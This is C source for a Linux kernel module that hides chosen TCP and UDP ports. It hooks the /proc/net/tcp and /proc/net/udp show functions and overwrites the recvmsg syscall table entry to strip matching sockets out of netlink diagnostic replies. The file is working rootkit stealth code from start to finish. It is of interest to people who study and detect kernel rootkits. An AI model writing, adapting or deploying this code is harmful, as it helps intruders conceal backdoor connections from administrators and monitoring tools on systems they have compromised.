#include<linux/moduleparam.h>
#include<linux/module.h>
#include<linux/proc_fs.h>
#include<../fs/proc/internal.h> //proc_dir_entry
#include<linux/fs.h>
#include<linux/seq_file.h>
#include<linux/namei.h>
#include<linux/string.h>
#include<linux/types.h>
#include<net/tcp.h>
#include<net/udp.h>
#include<linux/netlink.h>
#include<linux/inet_diag.h>
#include<linux/socket.h>
#include<linux/slab.h>

#include "hooking.h"

#define MAX_PORTC 255
#define in_tcplist(x) port_in_list(x, tcp_ports, tcp_portc)
#define in_udplist(x) port_in_list(x, udp_ports, udp_portc)

static unsigned int tcp_ports[MAX_PORTC];
static unsigned int udp_ports[MAX_PORTC];
static int tcp_portc;
static int udp_portc;

static int is_hidden = 0;
static int rcount = 0;

void ** udp_hook_ptr, **tcp_hook_ptr;

module_param_array(tcp_ports, uint, &tcp_portc, 0);
MODULE_PARM_DESC(tcp_ports, "Array of TCP ports");
module_param_array(udp_ports, uint, &udp_portc, 0);
MODULE_PARM_DESC(udp_ports, "Array of UDP ports");

static int (*orig_tcp_seq_show)(struct seq_file*, void*);
static int (*orig_udp_seq_show)(struct seq_file*, void*);
static long (*orig_sys_recvmsg)(int, struct msghdr*, unsigned);

static int port_in_list(unsigned int port, unsigned int list[], int count){
	int i;
	for(i = 0;i<count;i++){
		if(port == list[i]) return 1;
	}
	return 0;
} 

static long my_sys_recvmsg(int fd, struct msghdr __user *msg, unsigned flags){
	long lres, msglen;
	struct socket * socket;
	struct sock * sk;
	struct msghdr * mmsg;
	struct nlmsghdr * nlh, *nxt; //netlink message header struct
	struct inet_diag_msg * diag_msg; 
	int error = 0;
	unsigned short sport, dport;
	
	rcount++;	
	
	lres =  orig_sys_recvmsg(fd, msg, flags);
	
	if(lres == 0) goto out;	

	if(is_hidden == 0) goto out;	
	
	socket = sockfd_lookup(fd, &error);
	if(!error && socket == NULL){
		goto out;
	}
	sk = socket->sk;

	
	//check if family (important) and protocol match (otherwise the cast might fail at some point?)
	if(sk->sk_family == AF_NETLINK && sk->sk_protocol == NETLINK_INET_DIAG){ //that's a bingo!
		mmsg = (struct msghdr * ) kmalloc(lres, GFP_KERNEL);
		memset(mmsg, 0, lres);
		
		error = copy_from_user(mmsg, msg, lres);		
		if(error > 0) return lres; //copy from user failed, can't access memory

		if(mmsg->msg_iovlen == msg->msg_iovlen){ //prevent us from processing garbage (happens)
			
			msglen = mmsg->msg_iov->iov_len;

			nlh = (struct nlmsghdr *) mmsg->msg_iov->iov_base;
			
			do{
				diag_msg = NLMSG_DATA(nlh);
				sport = htons(diag_msg->id.idiag_sport);
				dport = htons(diag_msg->id.idiag_dport);
		
				
				if(in_tcplist(sport)){ //don't hide target ports...
					lres -= NLMSG_ALIGN((nlh)->nlmsg_len);
					nxt = NLMSG_NEXT(nlh, msglen);
					memmove(nlh, nxt, msglen); //shift entries
				}
				else{
					nlh = NLMSG_NEXT(nlh, msglen);
				}
				}while(NLMSG_OK(nlh, msglen));
			if(lres == 0){// no valid message left
				nlh = (struct nlmsghdr *) mmsg->msg_iov->iov_base;
				nlh->nlmsg_seq = 123456;
				nlh->nlmsg_type = NLMSG_DONE;
				nlh->nlmsg_len = sizeof(struct nlmsghdr);
				lres = sizeof(struct nlmsghdr);
			}		

			error = copy_to_user(msg->msg_iov->iov_base, mmsg->msg_iov->iov_base, lres);
			kfree(mmsg);
		}
	} 
out:	--rcount;
	return lres;
}

static int my_tcp_seq_show(struct seq_file * m, void * v){
	struct inet_sock * inet;
	struct sock * sp = v;
	struct tcp_iter_state *st;
	__u16 srcp;	

	if (v == SEQ_START_TOKEN){
		return orig_tcp_seq_show(m, v);
	}
	else{
		inet = inet_sk(sp);
		srcp = ntohs(inet->inet_sport);
		if(in_tcplist(srcp)){ //tcp port list counts rows
			st = m->private; 
			st->num -= 1;
			return 0;
		}
		return orig_tcp_seq_show(m,v);
	}				
			
	return orig_tcp_seq_show(m, v);
}

static int my_udp_seq_show(struct seq_file * m, void * v){
	struct inet_sock * inet;
	struct sock * sp = v;
	__u16 srcp;
	
	if (v == SEQ_START_TOKEN)
		return orig_udp_seq_show(m,v);
	else {
		inet = inet_sk(sp);
		srcp = ntohs(inet->inet_sport);
		
		if(in_udplist(srcp)){
			return 0;
		}
		return orig_udp_seq_show(m,v);
	}				
			
	return 0;
}
/* 
* Auxiliary function to find the proc_dir_entry of a file in every subdir
*/
struct proc_dir_entry* get_pde_subdir(struct proc_dir_entry* pde, const char* name){
	struct proc_dir_entry* result = pde->subdir;
 	while(result && strcmp(name, result->name)) {
    		result = result->next;
  	}
  	return result;
}



void hide_sockets(void){
	struct proc_dir_entry * net_dent, * tcp_dent, * udp_dent;
	struct net * net_ns;
	struct tcp_seq_afinfo * tcp_info;
	struct udp_seq_afinfo * udp_info;
	if(is_hidden == 0){
		list_for_each_entry(net_ns, &net_namespace_list, list){
					
			net_dent = net_ns->proc_net;
			tcp_dent = get_pde_subdir(net_dent, "tcp");
			udp_dent = get_pde_subdir(net_dent, "udp");
			tcp_info = tcp_dent->data;
			udp_info = udp_dent->data;

			/*Get show function pointers of the tcp and udp files
			* and hook them.
			*/
			tcp_hook_ptr = (void**) &tcp_info->seq_ops.show;
			orig_tcp_seq_show = *tcp_hook_ptr;
			*tcp_hook_ptr = my_tcp_seq_show;

			udp_hook_ptr = (void**) &udp_info->seq_ops.show;
			orig_udp_seq_show = *udp_hook_ptr;
			*udp_hook_ptr = my_udp_seq_show;
		}

		disable_wp();
		orig_sys_recvmsg = syscall_table[__NR_recvmsg];
		syscall_table[__NR_recvmsg] = my_sys_recvmsg;
		enable_wp();
		is_hidden = 1;
	}
}


void unhide_sockets(void){
	*udp_hook_ptr = orig_udp_seq_show;
	*tcp_hook_ptr = orig_tcp_seq_show;
	if(is_hidden == 1){
		disable_wp();
		syscall_table[__NR_recvmsg] = orig_sys_recvmsg;
		enable_wp();
		is_hidden = 0;
	}
}
